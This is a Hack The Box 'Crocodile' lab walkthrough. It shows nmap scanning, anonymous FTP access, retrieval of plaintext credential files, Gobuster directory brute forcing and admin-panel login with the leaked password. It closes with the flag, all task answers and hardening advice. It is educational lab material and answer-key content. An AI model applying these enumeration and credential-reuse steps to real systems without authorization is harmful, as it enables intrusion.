# Hack The Box: Crocodile Writeup — Very Easy

> **Difficulty:** Very Easy | **Tier:** Starting Point Tier 1 | **Tags:** FTP, Anonymous Login, Web Enumeration, Gobuster, Apache

Another day, another box! Today we're combining FTP anonymous access with web directory brute forcing to grab credentials and log into an admin panel 😄 Let's dive in 🚀

---

## What is Crocodile?

Crocodile is a Very Easy difficulty machine from Hack The Box Starting Point Tier 1. It teaches you how to exploit anonymous FTP access to find leaked credentials, then use Gobuster to find hidden login pages on a web server.

**Skills covered:**
- Network reconnaissance with Nmap
- Anonymous FTP login
- Downloading files from FTP
- Directory brute forcing with Gobuster
- Web authentication

---

## Setting Up

Connect to the HTB network using your OpenVPN config file:

```bash
sudo openvpn your-htb-vpn-file.ovpn
```

Then spawn the Crocodile machine from the HTB Starting Point page. My target IP was `10.129.1.15`.

<!-- ADD: machine_IP.png here -->

---

## Step 1 — Ping the Target

Before doing anything, confirm the machine is reachable:

```bash
ping -c 4 10.129.1.15
```

All 4 packets returned with 0% packet loss. Target is alive. ✅

<!-- ADD: ping_check.png here -->

---

## Step 2 — Nmap Scan

Run a full service version scan with default scripts:

```bash
nmap -sVC -T4 10.129.1.15
```

**What `-sC` does:** It runs **default Nmap scripts** during the scan — this is the answer to **Task 1**.

<!-- ADD: nmap_scan.png here -->

**Results:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--  allowed.userlist
| -rw-r--r--  allowed.userlist.passwd

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
```

Two open ports — **FTP on port 21** and **HTTP on port 80**.

The nmap output already tells us:
- FTP version: `vsftpd 3.0.3` (Task 2)
- FTP anonymous login is allowed — the code returned is `230` (Task 3)
- Apache version: `Apache httpd 2.4.41` (Task 7)
- Two interesting files sitting on the FTP server

---

## Step 3 — Anonymous FTP Login

The nmap scan revealed anonymous FTP login is allowed. Connect to FTP using the `anonymous` username (Task 4):

```bash
ftp anonymous@10.129.1.15
```

When prompted for a password, just press Enter. We're in! ✅

<!-- ADD: connecting_to_ftp_anonymous.png here -->

---

## Step 4 — Download Files from FTP

To download files from the FTP server, we use the `get` command (Task 5):

```bash
get allowed.userlist
get allowed.userlist.passwd
```

<!-- ADD: downloading_file.png here -->

---

## Step 5 — Read the Downloaded Files

Check the contents of both files:

```bash
cat allowed.userlist
```

<!-- ADD: usernames.png here -->

```
aron
pwnmeow
egotisticalsw
admin
```

The higher-privilege sounding username is **admin** (Task 6).

```bash
cat allowed.userlist.passwd
```

<!-- ADD: passwords.png here -->

```
root
Supersecretpassword1
@BaASD69032123sADS
rKXM59ESxesUFHAd
```

We now have a list of usernames and matching passwords. Time to find the login page.

---

## Step 6 — Web Enumeration with Gobuster

Visiting `http://10.129.1.15` shows a business template website. Let's find hidden pages using Gobuster with the `-x` switch to look for specific file types (Task 8):

```bash
gobuster dir -u http://10.129.1.15/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -x php
```

The `-x php` switch tells Gobuster to search for PHP files specifically.

<!-- ADD: task_8.png here -->

<!-- ADD: gobuster_scan.png here -->

**Results found:**
```
login.php   (Status: 200)
logout.php  (Status: 302)
```

The PHP file that gives us an opportunity to authenticate is **`login.php`** (Task 9).

---

## Step 7 — Login to the Web Panel

Navigate to `http://10.129.1.15/login.php`:

<!-- ADD: logi_page.png here -->

Try the credentials from our downloaded files. Using:
- **Username:** `admin`
- **Password:** `rKXM59ESxesUFHAd`

We're in! The admin dashboard loads and shows us the flag. 🎉

<!-- ADD: adminpage.png here -->

---

## Flag

```
c7110277ac44d78b6a9fff2232434d16
```

---

## Task Answers

**Task 1 — What Nmap switch employs default scripts during a scan?**
`-sC`

**Task 2 — What service version is running on port 21?**
`vsftpd 3.0.3`

**Task 3 — What FTP code is returned for Anonymous FTP login allowed?**
`230`

**Task 4 — What username do we provide to log in anonymously to FTP?**
`anonymous`

**Task 5 — What command downloads files from the FTP server?**
`get`

**Task 6 — What higher-privilege username is in allowed.userlist?**
`admin`

**Task 7 — What version of Apache HTTP Server is running?**
`Apache httpd 2.4.41`

**Task 8 — What Gobuster switch specifies file types to search for?**
`-x`

**Task 9 — Which PHP file provides an opportunity to authenticate?**
`login.php`

---

## What I Learned

Crocodile shows how dangerous anonymous FTP access can be. Leaving sensitive files like credential lists on a publicly accessible FTP server is a critical mistake. Here's what to fix in a real environment:

- **Disable anonymous FTP** unless absolutely required
- **Never store credentials in plaintext files** on any server
- **Restrict FTP access** to trusted IPs only
- **Use directory protection** on web admin pages

---

*Written by [Tharindu Pathmasiri](https://github.com/tharindu-L) — IT Undergraduate | Cybersecurity Enthusiast*
